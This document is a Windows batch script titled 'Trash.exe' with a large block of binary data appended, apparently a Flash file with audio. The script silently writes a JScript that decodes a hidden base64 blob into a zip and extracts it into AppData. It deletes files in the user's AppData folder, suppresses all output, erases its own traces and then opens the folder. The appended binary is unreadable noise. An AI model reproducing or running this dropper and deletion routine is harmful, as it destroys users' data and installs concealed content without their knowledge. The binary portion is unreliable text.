@echo off

color 40

title Trash.exe

echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js

set v="%appdata%\"
del %v% >NUL 2>NUL
cscript x.js >NUL 2>NUL
del x.js >NUL 2>NUL
del z.zip >NUL 2>NUL
del x >NUL 2>NUL
start "" %v%

FWS3  x Ð  p  8 CÿÿÿD   ¿    ü'×Ÿð—‚     } ÿÿÿ=ìÁÎÓy²l &° ÇÇ›# Â`ŒyŽr &P 88˜ääB`s€^Õ¬ó% ?m$´[i4Â Q0€ÕµE·m€
 Â’ÛT$ÖÛ> PÏ€	*KBL“ ø/h}Žmû”z2SnÊ (²€—%šÂÃ:”7¾~]ŒôƒëDëÑó÷ªì`Üá‹xkmŸ (gÀ•%¡&I€~€Ÿ¶’Z-´ša (˜@jÚ¢Û¶À	†€aIm \îƒÓ( Lrr ¡0†9ÄÙ6 X cãÍ‘a0Æ<Ç9
  ¹ó7Oæ °8Ç˜ç!@e ƒ‰ŽN@& PÇ8› æÀk |y²2 ,{3³œ€(L ¡Žq6AÍ€Ö øódd XL`q1ÎB€Ê  ¸Ã—fP 88˜ääB`s‰²l &° ÇÇ›# Â`ŒyŽr qSMÉÐ“[løC> $©-	2L 3ô ý´’Ñm¤ÓDÂ [VÕÝ¶ L4 
Kmã¹\‰˜ääB`s‰²l &° ÇÇ›# Â`ŒyŽr &P 88Çõ>¯6‚}Ê=)·e Y@K’ÍaaJÐÀŸ„›A>åŒ”Û²€
, %Éf°°Î¥ †   ¿Œ     _ ý }Ú4®j³ 5aÊÈdm‘WF A9H —_ä\}6WBÞ>¤×¯í€RªÐH¸¡" ¼€/‚^… IHa&L€R†!‚à 5KµÝMÌ „œbÄÊáÝÖ¦Þ‹“d%æ€I8_/à+ÍroÜ$¦Ä´ b¿. %Êðý”¼ÏÆ|NÚº7LwÕÏ.¬ÕÀK€â2ZˆiÙ _CdÐË@’à4ÎM3©@UYrbÍÅ 	^€NRS¤!˜$T°:¦ úvíFkAî Ùl–ÞbKØÉ@$*bE˜p  5fÚœùP”À
 ‚R‘Æƒ¬Ûé-÷Æ…;7òÞG€|¸Û5¨FÙ ³ OWL}\Ä+À
ìÕÌeùÝ'—qÎ›:×xFžnÞ‰äh,
•*LdŸ)'Æ%¨ê‰´Í & e,6•cVÀ%Z]=Ø¤¿oqÈ 5Fô™–°%¾ƒÓ­Æ¤¿ªxÝ&rQ„“á( ©x–æ23 Uà°æ f2:˜ÈéU g•rÑ4 TÞ¨¹ÇfœZ M\‹6. œÀg·Ó_-€Lš bf 5bæ¤d8ðr>LO¬	+dÇ+
ÏÆC±X	 óÁQ}ð®€Vtfs­h}·$:7k[ëJuJˆ
Û´ù€-¿:´ëVšù“ ,#O7oEr4 5Ly”Ù"
åxíÖ$ ‡!XÓÊ0:)nGtnÌT¨ 
ï!›n°Twh’€…Ã$¼1Ù6(*ëÊP‚‹Œïiõ±
¢–ä{FìÅJŒ ÍòŒÜví[oìÜž]ÇZkç]ñx»z+‘ ¶ËÊé ¦ l˜ 5GŒ“’P&B\¤7§—‚€¦ d(H˜%V Ø˜ƒ`z`l»©nÐ’ ’<¬ñ93@ú|ÆÈ`€{‰ü¸ßÌA,Ä@M0‡]6mÐT  Ÿ…)ø,ñ€5F¬í—I]÷[r€L(¤ƒ‰2 Kàh¥¹ÑºT`õÎ¿X9û´ý¿´:t¦;æ`×tFžîÞŠäh+²Ï1ÔÉàŽ ’2$€H™›&g\—]òUv GpY@ 5b–ÐwRÛ
z¨ö%xR™@->CPP	
¤?RlÐN]ìp—›À$¤
³’¬õ¦^Ú Ná³6-ôp‘Í]šS™KÜÚAw˜ð 5H´mÜNp¢Ó '‚	HD°kGßHéo»Ž4)ÙŸ›„F\$/ –Èš¥É«­Ù½w@07fr€Áçžší×;Ö»ŠÎ`aIK@E@s)MóKk†ü”ž\ååÊŸý@5K,mÜJè§%Ál6š–×½?É›•TŠZˆ«€’0-¾Ko© ¬í$76 ‘/K#Èx	c).ªm °ã®TúôYÓ]2kÄÝhÛ¸ÖÑO2²T¥GDò€&Eó{Ÿyž!f~Ï<ï¦/tm     Times New Roman !adeinortuyÿ@    x µªÀYƒï€ Ž ÿÿÿV·î:œpre—‘”Ç&PÎ8:Ÿ£qÊ~ÇIúˆ ð   Š  ”ç0€¿©(   &ìÙ  aÿã À   X@  ð@Äœgâ~çå Â 4ð ¡DþBŽx…Çÿ…Ã‡®WPGŸÿ°Ùú¨'± Åÿÿx ÅÎDÁ±`P€ $Oÿÿî;Äèlq€ÿã À[&Cæ8“˜ 0WD8`­ÿÿÿÿÓOr,Dàä Â—ÅŒ‰  Âá?ÿþÌ»ÿþ
ð8À 7 ,På°Ä
	5RÉH’ÛŒ=Ç>ÏÀ¹é_«˜<¢§8»ÿã Àª–Õ½‰) ‘˜…n§E¼“M#X^›¹„È•èËFçžêF=(ˆ&ÚŒž«e(öB”Mèr³‘ïd­ˆºl…qwê&õáx˜•	ÜöD gÿ_ü€bYÉ/€¶³3=pÿã À
êþæ=Ì(I‘`N;ÀâÄ§˜¯:ù²èB pT‡tÿÛÕö¡toÿÿõýÿN›%uí_ÿ÷ëj)„ºÛvc¾{)Šus±Š„BŽ9ýà€ôãQ díO:éeëë_K¿’º
üÿã ÀQ‡<;Ä’ú•X/cp„!
Ú¯ëûtÞÈÄÎ  CèÒ)óººœ8<X³  Ù4(ž~ÿÿý;Ÿ Ò ’€%ß2€ÛZtêÁU
ÿ½*ŠÒ¹ÿ†~ßÕ^z,dR\áÿã À%iS+þÄ’ç0ÐY©&ÒŒi*Ó¼4	Ò/Eš”%ØÜ}JYw2„#šH˜‡v’65»ÿ€1M›¥*>¥©Tsõ»1Oæ?ÿþ]T®ÅúÅîJÆ5Áàè·½…Ï±Áÿã À6©GRþYD’”îyW8:–©â+Ö9ƒž h:dˆÿ
Q(ÿà¢»2*û$³eQ½]›Xæò?ÿþŒÏU—þv*uoÿÑK]ÿÿýÎcÿ~‰ÿû"©	@M³E5hÀÿÒ$wÿã ÀF"§3þh„ºÿáóJÖ¿õNìâƒÁ
ðjËÓÿþª¦u—›8ãŸê>œ•ìßÿ¢ëÿ–v°Çêµ"`x*ã¨F6=v½¤ûmX)ýÿàTRÏV´î´ÓHÚp%yŽ;ûÿã À`±Ÿ/þxŽ–·˜¿ôI…-&y¿áF<ûU‚;!{’9”‘¥+ñ«-¢a½%‡2TÓ«
	C	LjÔ•€²6ÐúÀÉ,É©(ªƒV´³%…`OÐ(®ŒìoýÒFs¼r³²ºÿã Àt‘;þ€„’þÊ
ãƒ}]Š}–åÝŠ…16ÿ«¥ù×«Vy•z™î‡}é:%¦çf
ä+±ÌF(`±^"V6€ÖÙ  ‹Àö´—÷Í~/ókø¹Q‹î(¬¥0Èþâÿ;’¿WZèGÿã À€Òêóü˜„»¡Š¬»¡ðÿŒg!˜Š–’edËÎdH‘—&Yx7Bxìy—‘—òw fˆµ‘J°÷ýJ Š< ­ºÞ“5wA“ôöï§_º?üéÿR.UT|÷%xÅÿã À¢Úãüx†¸Dt@(CwboÿÕïb"ÿ¯œ¨W5©µQ\AK9ÙÖs+™JÈÛ¦®t
Pæ°Þç!Ûˆûð™™™µ¤ÑwÚ #Ztd²Î8"Î•‡„>S¡¤ŸæVªYÿã ÀrÚûþj¹Äá”6ÂÔ2, ‚ïè“ä>-h\àD¢¡Ž9&fÀƒ]ÜÆæÔÑÀˆx†ÖFÛl B·µ&w
§[H79ùD_@ïïÿ äv(R/Ñ×—Ëèamÿÿã À|Y;þ9F§ÿqŒ5ÁÀ¡ó€ßY›–ü©à@ójM	Úë£)RrÚÌs¬ì;V}R.sG_”@®ÊŸîAP Q ó"+uâT_b ó¿ÿÿ³·ÿêôóJúÙ®ÌsœYA˜ìÎæÿã À…CFþX„’:é–‰¡œÊ@ºjÊyüÞ.èû}ª%5Àµ3*ÇYwRFìÑ&ìCÌW×Ù¾ŠC)MdÿôC/G¸#PÅoì¶t¡˜«éþÅ»¤‡OòûÕQ„³·fú·–€Œj™ÿã Àžê×&VYD»…ÙñêþÝKsŽþí£$µ) vky‹
˜Õïjßú^cõr2+È†ºJÆ)ý_ÈJ‚nûõÐ8æT€jdû€âš¢ DÇˆæ­×(‘-üÉ§ÿÿsµÏ†Ÿÿÿþÿã À¥BÓ#þh„»TæE<C™kTÅ‘ü(‹ûm£eUÀFMIºu-è˜ße¾õÛ&“_Òg‹ÍpÖPCzªQ«ž6’–åF:édÕjRŽÄj­4‹±³7™ªÊj)jÅ>ûÿã À«ê÷'þx†»ÿ¼ÛÝ]VWo³U‡SZLÐ¨‡v€4“ GBÊYk)h¦cÏH¦ªõG01*ÞÁ›½jÚP+#ûï1û¡µêâc"y^ÜÖi¹¢ÿõ$¸©¿¬`2U`‹“ÿã À¦ë'+þhÄÛåD24ÖÛY< Á0O1Efô(Ÿ2rüÈvýT$Ñ”ÄTo25.ø\ÔéLÛ_¸1ó>ûíXÏžÍïàÕDìëTç’SýÖURVc0#¡!ÿæXN Ô*±ÿã À¥ñßöh„”ÿ·'ÿÿþÌÙ›¼ì×îÌuX±Bj€"½p™‰—ˆ‚Û vk{Å7W“îõƒºá±r+"&XnLÆ|ãG@,Díßû²öîòAÈ9ƒ.Ý97wß/«ÂËvŽÊ¢5ÿã À°#"áìi†Ùé¸7w>9ž_÷'G® C!g\¼ÿç™¿7<ïdL#†Ç#P¸Û][Dß(€s˜§Ñé·öÃÓ}ŸEùƒ|åVýP™4)«s8u¹,C±UYÕ›ÿzL‚)ý,RÙÕºÿã Àž«
þþyÆ¸¹†29	9Ñ¿!Èâ»ÕŸ“KÙë¨r ¶ÝRi_¨ -¥aÉ{)ØŽñ‹ó¶‘IÆ‹ývkø˜qBàoé©¥!ÿï’úçÌfoêàŸ„)B¹Ñ TÿýPÀÊžÿã À’Rg+þX„¶.ëGÊäDcdÅDX£Ê ÖëcD¨ Â»¤\ÚºßÏ|(úœ½„
ÜßùòúhD½ƒýžûˆŸÿÇ…B‡<%æh UÿÿfbsŒ(ÑÖ(ÊyÿÒ	B‡R-v„Záÿã ÀŸrs/þ)D¶nˆ Ú›Hµ@1¢Õ/ÿu6Èp‘û7AÓÿï×ng·óò“þŽÇ1ö9Ï7ÕþR­Ú¡B´¨Êº=~÷Á¨GVGe2¿Š2Q‚‚ïQ¢Ô€ˆfx ÿã À¨‚/þYF¶%’8€"öò0}uÏZI¢"!ÅÐæ|£C¢
…
ÿ³êŽtwª—£q+—oèŽQVpŠ
B‡F[¾]ÏCNSN€Ì7ü
Œe‹ ~q¤ey°ûm¥D_ðÿã À±
«3þADºÀYÇ!	Y)gqo‰ì	{€¡ïAª]ÿ×ú¯!?õJ?ÿ÷•
ä²„LNs°°ñq/Îqq à \=üCAž,üUúÔD@ÚÛc$Ë 1tÌ*v³\ÎÑwx¡ÿã À»bþAJ´3áÒÝþôgV¥Õèï7Ê–#ÿýì
™H‡Uû‘¼AWÊ®åÏþ”²n¤â‘	Áô²µh Œ(I
+Ö?”à›mœÕ—hr¸ÔÑLÉ Añ' ó‡ÀÀ	Tå3ÿûÿã À¼27þYJ¶N¿7þç›±ÐÉ?¾e7CyBBê™KüÍ"yð(“ÄÀapé×;]¶¤Ðh]4ÌT*ð”ÌŸQ†Ú©2cÐÊ¨w›´$”±•`¼K‹Ë–mí«àÿã ÀÊZ×/þAÄ»¿lœk Ðò)™Ënîí>wíÞ'AËÌŒÖÖÖgÿIÝ§ ³Iöjr)ìáåÙˆrSŸ²Fá|±‡Ä8¡PººGGü¾Ÿ)¾œØ)Ö½Þ ª™u°EÝYŒÿã ÀÓº	þF´ýÃ®«ZZÛÌ±2„’ªª/ÄXŒÓýDü4ÃÌÓwkõò²œ¥ uÿöv3#LB³ˆ~ýÿ¤ÿÊˆù¹ZºN“±[ôÝgû¢i³ìè;~%E€šË$´ˆ 1òàÿã ÀÛ:&åâkµzÞÍkq‚ Îe`½Ž*½H­þT6RÍrò—û º¿ù²¡\H £7)YÕŒÊÊf;Dt”ÏDL(Â‚¿GéÜÉ¡ ¤ôÚ)zñ¢ñþŠº6
¤Xÿã ÀÁÓþz¹–EÛuTšD’…¶üd"ÝiýØà«nÕ2…Òß^I$²	UÿîÈº‰ŠµŽ/Û†5âÿþùŠ»•-R0¬:óüÃ"MOÅýÑmÃ%óÿû^‡1=æXÑtÙSViÌ*é2Ñÿã ÀÀ‚gþAD·ûñ/þ5 ’A,Ð¨À5(ã%[P¯™šÁJ.Fqi¢µ>´P·û*	vWòŒªhCuÿôíw„
…Ýº–{¼ÊGDî×ßÿ¥™dèãÖ4:œËÙ2‡Æ‡¡xÿã À½â‚ÍLjPµºk¤wå#Ö€òÍìlÔ ›-hº©$Ó“&¦L*óºŽyy2‘"¯ßîÇÿü¥–~kÿ÷ªyiK÷
Šäv_ý~)jð”tM”Ÿžˆ¬é›Õ”¨$Hc.âÀÿã À°RêÚ6h†¹¨	dÃ‘’¸´QÞÐP…çä ÚÛ\Ißˆ V™m#Ê±¢
¯=Š{)`û¡F?×õsœ0w~›+ÃiåÞL}É[)ß?3PÊªÉ›´×ÿ÷óËÉAì„–§÷Ð ©ò¬ÿã À­ÒÖ4™†´¦}	~QÁõ>&¤ÔÒK¢à¨š)-©¢µÌ«p5üŽ?Ñ4ÿ(¶-RàpJ ìG:éêvÝÉ m/¦µpíA”Ù~—¤äC+ÈÎjµÕ?õ8t57úÿÿã À¤:þ†¶^¯ã\w>ùù<ÍÞëµÊõ§Áo‡²#Þû—ÒlƒÃÂÓ<‰Ë	&š=]­3…÷ÞýN¦N¡èÁ¾Xë©­„ñ‚êý²*ñ?v”êú±üÕmRÿã ÀªrâThÄµpà°d	ï´ÿ½‹&<}š]HŒÛØ,´ˆô x°„"#×@’I$†ª¦hÿwisCB¯òkˆù*ŽXþP¤@ BLXe8‰s:ŽErE¼ …AFÿú-ÿã À©érî2Z^¸6dª­©—V²â‘¿Vu©f)äH0˜ LSX a®‹e[¨ÚëcD+ZÀ¢µžEjjµ)vNÀMæ»sò*+7ôKGwƒˆ1Ê‡ûHÇ;=­ÿ£Ô®9Z&"ÿöÿã À”ò“ü@Ä¶ªhÎu±h; Áqƒ‰Þµ ¨*€êÌŽOö9€]XÚÙRH€2 <vc„é)ÝL¥—P¥Kü™v€NµP*—ÿç@^gÛÍuü¬¥B
rÿÿÔÏe7þ{R×GKƒÿã À“j/'þhŠ¶`Éécƒ74u¾søÈJUÞ¤€û}ãlT×`
U\É+2²ÙÕ'ýˆmziM§%ÿüÌ‚Ì“!ïn­&¶:gJôÉ]Y?©ÙìuòCžåTº;]?j03¦ì 'ÿã À˜
#þ€Ä¶P©—-6ÖÔØÇiÛ[\i‹R 2s”ZgÓ»5r`íêæº¬üè¥pÅÿØîš³{ï¶{\ˆÔdíO:ôAN8 ‹ýXšÚ¬´WDö¹gR,eåÇ­5I”¬~Q;–™ÿã À¢Bvò^hÄ´wvø„8äE³Úl&,sXnþ·Žòz¯Y€™¶ý&yúkG£—}·Öãå)4¥%‡¯ùõ.vó'êØ(¢7oê§?þRª)Èpçýÿ•Xä9Èôëeiö!Ô#êÓÿã À¬#þ€„¶)§ï¯k™Õ¡ƒB¦ê@ŽHå ¸ÀÂ¦á”ù¦îŠ»˜¬¥x'4Dã­1û¯å»òge?ˆ …DI™ôþÕ™›ý_¬ê¥õéÞ¶«£oQ«Yì·¹T¤sŸg²ÿã À·ÒÚöÖÃ¸Ik‚:`àˆ¦‰Dg¹@×kE]@Zæ™7µ— 2¡
ÿB'M±«ìgÜ ‹
sOÏ†Ì©]¾¿"ÚYKžil‚ŒØ¶"Â‚è
Ž;e£ÿã À¦›6XÄºñ`Ê@À’I( 9 R^boÞµrƒ ýä(`¿"¿o%Þhc)Rë²çTçy&ÿÿüõ'l¼ž¤ì·ÜÔn²®¬¦TŽ„.üÉ²ª
3&]ö;†è¥×ÊU ²Ë9ÿã À¦XÃ'þXÆnI ­E”­zžfl²ë„‘á!C¾oÔ¥BˆÛÿDg,ÙŒWÿÿþÎÏÿûûùútò«UÈ®F5@Æ±pÕ…ŠÝ*È½@Ó[aH‚ÖÐ+k©4Ô½ŒMÔêÿã À¯ÒÇ6@„»O•Žòäî_Ñ4UÓ§Ù‘®¢%µ/ÿôÛtBõOe¤Ë¨²³µÖè¥jç.Y(c³¦×E®{©HJ•%G~å€ˆ†eÔ í°we9¢jk³$i½Í'yêÿã ÀºZ6iD¶Ì”^íŒÈŸ½;B”ïÿÓì]Ô®ˆB£ò1ÄÎíÿv»ºÊDkP•v;­	:¡çŸ;*¥:±hS’rÅ:ÌîD]¢˜Œ“¨¹4Ëˆ× †vfu@wí€Âÿã ÀËÊë^hŠºYï–[œÞí¬7Cóþæ< ·Ûz›‘§és¹¿ùQªÊiûî…á°QØ’¥¾¶ê¬¿ÿô¢šÏW{{$ÏÔÉPMyL²¡Ô8½éT9Jp@vEà}K7Ÿâ6Ú[½hÿã ÀÒ
òÞiŠ¹"É <hÔù¹îÎeÜønS=]ÍT¹XÊ™K‰:çäÒmšûq ¨zÉv™PRùÿý(©ÿÿÿšîï¢4¥mJIÁD²µæ¡³R»p¥6ñh(ô&ä¿r{ÿÿã ÀÀ:³
þY„¹È·èã €Úà
U»—<‚+ ªèÒüátskÎNÖxjÊÝø*¬7cµ›û³È
··‘t‘IËÿý&ÍÆîDY~Ñ²<¾6àU-UH,v
Æ
 ¤#ëÕÿã Àºò—6z·½jÆÀ‡L¢Ÿt¦²êáP˜ xv†Õ&Wÿ€[—6.™ld¯rù`¿ö÷ãîîâ
$[÷Íí‚·ÜØñßÿÙHF8À P\'?ÿ’èÇ:÷ú¹òd‡Àâú#¹ÿã ÀµjÊâ^i†¹Çz9HÑrTx˜€¡	E£*è³ˆ‹„s¤Ï‡¤vŸ ÖÛ\iRrÚCº¹êc«]ÕhÞƒ­˜J‘¨¡ØŸØ]”ÛS8§ü
oÿÿÐËÿú·þ¹’Šw"	ÿã À¦¢ÒþþYŠ¹W y…Kï/ÁoÕkÒ¡¨"É%7õ”ÿïì ûðºªNëöÌ]=¥MAJJÄ¹Wý`O²û9œ1Îˆb•XŽºéÝH¬ìVÿìõ!•Už¶GË•’ÿã À’Â‡*VPŠ· "%‚¶´rÄ !åCRGJÖTBÝ×ïHûb ?à5l¢á‹ïf³ÏÄs9NfM‘At³‰…¢|ò|žK9|½%dZ¦pêd’›˜D¥À•¤€Å‹™,~5~¼’üÿã Àž*O^X„´­ì2`Y ñ¦DA¢ƒ^aiQ¡à˜’,fHvxw í°Vêc#e5“Mtªr
üÍÑ.b¼á?ùŒÇ±F=^TG'kM0¡ÿú5ÞGäoÿ“ä Bÿã À qBÑŒi’13„]èËww«Ã‡	€cÜ„d‚ç¨˜½	:öì…œA‘ýÀÚÛ¤IRrJDYÊc™µbC™¨`é!•ÞÆßú 1{»«ò
Íö)ŽËÿÿÜöÿÿ¿£œ‡öþÿã À³úöiÊ¹¿fÕÅneVUaØ(Ïÿx¸²I~Q*I 5Yh ]E”’Uf¨ÅÌcÖÕ™q¡5Í{—ÿ³5ÿ4ëT¢²…
ÕcÒVÿîI¬m[ÿýæ9tZ:¬×R‰j¢8PFP£	ÿã À‘ª¯*VP„ºxSÁAIU©N.lå,·ËÀ¯‚ïÿ”²G#I(ÒÀ2AN³#wÒRõRRSÊð£:ù.‡>þwFq”ÕO¢.M.päjßþÕ¥øêßÝäõ·b|‹½Z®’!DRÿã À¥rg
6j·m#ÎdMNêÕÿ'ß›ö¼s†€ûÝbD…Ë  R[±ÖS'­5 ‚Ì{á®ªY?ö­dI÷Ö{Ó¨ÍÎ×8$‚x‘%¥ý0€’~ó½ÿÔì“¿ÿíü§:2ôWÿã À¢Ë6ÿþ€ÄÛ!G¡1$!¦ W#çtÔÅêsô;œõu,F´¶ËDÁ¨¸,ƒÒ¶ÜbÄ¢)t°¯SÿAQ¡ÿò2ÕŽïý³‰uÙ¿ÿò˜ïÿÿ§C×e¡Sz´ƒÿã À¥»îNjDÙAµÎÚIÝýÅoí¶¹ÏÐ¶‹h¨²ÀsTÃêœ©Ê¼ûz&¬WÁŠ#ÿÃ ˆjtqE¨&ÿÔ€GÿéùÿwöýÛ¢z¡LŒÙí£Z‚1!Ê—¦§[%=+ûuSÿã À•ê‹#üAD·sï0ÖË[`å±ö7v·ºß¶ïµÃ„e¾Œ°²ˆýµ?èeÉsˆ<éOèâ¨$ ¡¬ÿ·jº+,ãÊ¿mýËÿ9O·i­¥äB%:‘Ô¹ª{wR‹‹ša¸4îâ×mÿã À¤ë+'þ8„Û­d+[ !7îKÄLÍ¯VÒ«žO,è¤ÿçB#LŠ¤é£•?úz+ûåÿèš^Ì¡Ã
EB“þýUÔìù–ë~çÌD;ª°a¨ú ¶ÛcE*rH‘éäJ®.ÿã À³zïüyJ»«É,)ZÞr3¡€’tÏ
¢ÿún
kJæ÷ë¡Je²¿ÿÿÈcÿúZµG¨¡•ÊÛjÍS£”¢±—š¾èº‘ÿ(¯$½}œ¶ÛcMÒ #ÄÜ—iÖ×ÐHô¦ÿã À¸Rï/þ@„º$uSPH5ð€³È¦slR5õ;Úó$€¹+ÿýTï{]ö÷ý]Qó¥þÿ·]„ŸÖ´uAjTú/XÛ[cH2rXìÒîÉzïæùÕ£Ç+N€H–¦Jÿã ÀÅòïVHÊ»væ¯ýJTÝUõË=}©7ÿÿõ9ÿý4Ê 4®oÿØéKHo®Äu9PÕc<Ac[º©mÕÍ€ˆˆ‡¤„ À1wCñK{“O?ê#« ¿Ûõ° ÃžVÔÿã ÀÈ*ƒ#þAJ¶Ã¿Ð 1ÿÿÿe¿ÿÉßÎAEJ9.ÇÊìr3ÙrRç÷#h}X®¤Žå~ê$ã*ÊÜxfv¨€ëhTgqQ2ýÈ$ÁÐJÈJ©ßÿ0J*`ã‹1cŒÿã ÀÒ
ëVyÊ»S!ò1©¿b#ú;ûÿýà,©DvkßµNFs1×k»™H¬`37¾ÞÁ½c	®¢²ØP™—wp€ Rë`Ãµ©›cpwhlfÖ§¶ÀŠî¬vÿ®ó;‰ÿã ÀØÂûþ@„¹bH˜qclã’pØn ·ÿÓßG1k×}7ú);ú&lå*s&«{~l{å«"ÅD>F"…t
ŸÈ²IyXI S†Œ«®§Z$Ò§ÿ >rØÕTðÐÿúÄ<s´ÿã Ààª§öAD¹e2]YKò»„Íwÿÿ§ÿÿÑ]JTUb"t+;ÎAHq…Jd}ÌˆfCtuwu.–² 9wØ¨a_( ehvˆK(Žæ5Wÿº™\Öëmì>fá‡gÊ»µ·Ïÿã ÀÜòsþxŽµ½oÛg–{‘T£Eçr´’*âP æÑÿ¥Y”ª¹©þ\ÇZÃOu‘kw5^¢†AÅ”¨¶¹åTds³¹®Ò¹
".ÚŠrCIð™˜v°¤@2ë@%o¿ªIÿã À×Zë.hÄ»œÑÖo{ê n~L4a=Vp˜é_•ÊÿøWš5Tü3FLýª‹
‚óO>Óuûß	¿ÿ7Õ;ýÏ=Ü-(•÷u×îîP¡ˆ ¼³mäa,þv_Öèÿã ÀØ²öÚöÁŠ¹žÉ*Y;X|Ž’#EÀ¶Ù:E&9@%ZjYÎÞähþ‡p# ±  KÿTvS„
U‚¡MOyPÇ7ú¢ÕÞÿÿýêBß¿²9¼Á’å·ÿýï¦YPÊÔìIU•ÆKÿã ÀÄRzöþzPµ Ómbewj6µ"ËR”´“—ÕpÂ«g3°Í‘—ùüóP«¬­Eme)Ä‚Bb¨ë/ÿ]ÑÿÿÔ¢%º¶Žúz<ÆR¨äLûôMŸùw©šæ8ü·MFnÐx‰zÿã À©£+6P„ÛÚ S_À¬ø¼¹§«ÍW^—»y<šBT–ˆ–qi_þ|!nB
ò6]74D¹‘ /¡e—ñ?9Éû¼/ÿÿË†õ”ÝêSïÂÝìIb<Bqeîgû.dNd€ö>:jÿã ÀµªRîVhÊµQì5n@œ‡xˆ…10šþÐÛùêßÿc×Ó/`@ çÆ¶m«!b;^Kawÿ40G^·¯æÑØö#n†8ˆ€>ÝïúØ¨„'üävF´¦1Ž(.»d]-Z^eÿã À¹òÎòþxÆ¹•‡"9„ÈG&bïK;hª¬®8ðâ4 èúícD]@2D²ÓÏ²Ò¤š*ÁÕÈ§Õ-Æ3ÿ©‹È®eªLcW»J%Ú¶ìúo”ÊŠCJVù¿}(¢)¦ÿã À°kb
¹‹w²7 à²pAisüoÿ¦·ýv£ Ó_á €Ûð
TY%QjÑIßb±K1Œè,Ì<q²„‡ÕÿÙBB.b³”Ô]”Óœò”ª`"þc~ž¬gª§þ[™ÊV	8dÿã À
#þ€„·_V˜ÏTZûß˜Ñp„çUm‘Ùp„ß(ÒÿÃ¯ ‡ˆˆÌˆ@wí€5 ƒ/[­w©g
!OôC ào¹éô`owáKi‹st !ÑÉ‘½§r-JýªvùÕŽûNöOúë;ò6Aÿã ÀŸbòê^iD¹Cj§<ç¡YÆ_ÃÏ@"
Cÿ <û.ïŽˆˆˆ„Ÿþ\p”—§­ƒã#C®Ï°"·ÿÄ9Ð†`ÐëôÈ¬J‡'ýÊÝ½ÿÿþ¨ÆgÕÒ¾{­P‚Õÿã Àœ:búþhÄµätš02±¤RÊ¾Ô.8×[ZIˆ½@[VÙÓ\Ø·Þ½±võÑtZX¬g¡JÝß¡EHkÚ”b³"±•BD™ÿïÿÊßÿüÉVZ¢™µl:„pƒ†ª1¼Ì÷êïžÿã Àšò¯@Š¸×M–¿ÊŠeÏÇ ³[œDÛ`
U¤l³f[-³ý?û ÇSÐù¼énÅFŸùvÃ™Û–wDÙLáŒª F®­í_éCfçvÿ£%C×­X¯wÕ2SAv'Ûÿã À©Úcþx„·K"@4:mÛß¬&ÞëÂ?X²ÍT) ¶À+--³‰þ÷ñšo7š¹îáD„s’`bÖ'hqyîçhQm®¡Ì¥.2°(,Cur³Ü¹ýó¤^¶qÈþù‘©ƒÍIìï©ÿã À¬Brâ^i„µçO¦-	Ì¶<ö.Ü=Ñ,6#V.¿,-Ó• ‡ØÎþëÖËdn ³ ÕÄÚ¥é[ë;øÓ{ìÅ8¶á9q>nÂ2²6× Â2B‰É„b…Ú •:Gï·_õþ©™k´ŒâŸÿã À¦Câ^xÆ¹ÒÔoÿý¿“úÎMê®Šäv²Ï½§j&ÌìçF(ðà¤ŽQdsÜDÉP›³Ò ª˜‡™¢AÿÀÃŠkYl{¼xiÇ=j
¾qKœèŽÿ¢>š;Tfg]uW;¢+ÿã À˜[þzJ»ÿìCVÝ[Ew¯nÛÕô±Hï©B·LUÙŒüê%AR>Øî.«É(Û]£M’„¶À0¨ØÓx©íµAÙÊ¿€§õSµhíþgSþÃêÍgþŽªr§ÿÿŸoý¶Óïfÿã À‰jWþYÄµ™%.ŒÅ l”DDYr:þ÷ÀaQÙ	€Û]#h*}@#?8¥µü»äêîà…z?ü¡ y‚†}¨ÇþîuÿÿöW"¿¯S–Ÿüš#ºZ½Ç*f(2­`æ³‚+<ÿã ÀŽŠÏ*^YDº]ÚsSÁ"€¶I+eI rç£Œ·º –;-óŸ4’Ž¶}¼|à÷¢¥:´÷_ª¥¿ÿþiŸþ_ÿz¬§:Ÿó²r‚:1«OÍô¤f&?W©à ¶Û=‘NG ÿã ÀžZs/þ@„¶YŒš“ÓP÷²g‚?uì0"Þ&5yÂbÿÕTänˆ‹óœUßùPX­ÿÿÎûßþ‰ôë2Æ,^ò¾³iF¶å¥ÿä¢äDõï´…!PÿmlM¤…ºÐ9íXógÿã À¯*ß6QÄºš{&-Ni¬ô*|Ö%þÄy½ýCioVq?ÿü~è»åß’µOVš¾M×cƒ`hƒ*˜¢Â…ÆSb!S£‰‚½©á ÚÛ"$"rÈRi©Ö’U5H3-vâ ÿã À½ëC6YDÚ¿*‹rÉsVèoÕ­ò ¡ÿÿþôÿý?÷o¹NÝ
”Ç8)Ê8Åvòô-ãH"ñæzI¿×~ÖÚõR@–Hƒ¦Ëjös*†Tý^oA%j˜vü‘ÀB.j:¿ÿã ÀÄZƒ2^YÄ¶8!(à‘ïüõ¢a4@PƒÑ…D€’YÃ€$I"T³å€°“\D&á œX¸ÿ]  ÛAF0ÞoZÖ÷Þï9TºU
îZêH‘UF5*’£÷HYlD*ÿã ÀÍ¢ÓViJ»Ðð™¾qM$g¢¢E˜O#å·²pÌíÿüb"£§9æ}Ò"!œüìCB),Š§™ÔÁBÌÌ,Ís9•ULgb1(U9YlªTéc:ˆº(÷ÍäI€ÚÐÕ ÿã ÀÙ©>h„rjÈ¤´ª¾_6ùç¹‰cæ6–ÉîfsÿSúBÑŸ²È•yéóM3z]Hb¿ÿþfä1åkmî!Öí"ä¤H¥$©©YÊWåCˆ#"Ñ¨ïó•6¹Œ1©×ÓÐ¬¾ý„ÿã Àá«6ÞÂJÙ66‘¤ I@"ŒLš³½G’m6t’Jª˜“Ïš-žæ³çÏÿ8@À-­–û/ŒH‘*%_ÿåÀ%%?ÿÿÿÿýañ¹Õ—cŽ¥ú­†¹C“«©eÇT5UU ª¼o¥ÿã ÀÁBòÞ^„¹Ÿ?mY°B›j«?–U€âV†i$ü a<YCœÖM:9ªÞÕ[ôr«?õG*;ucÊ‹ª8ÀØÆVÿÿþ“}¿Ý~ŽTcY-ëuÿuýXÊßò¡Ù?þ’¡¥`È)Aÿã À·S&ºþ‰†Ù’¢DÛ                                                                                       ÿã À [Jl 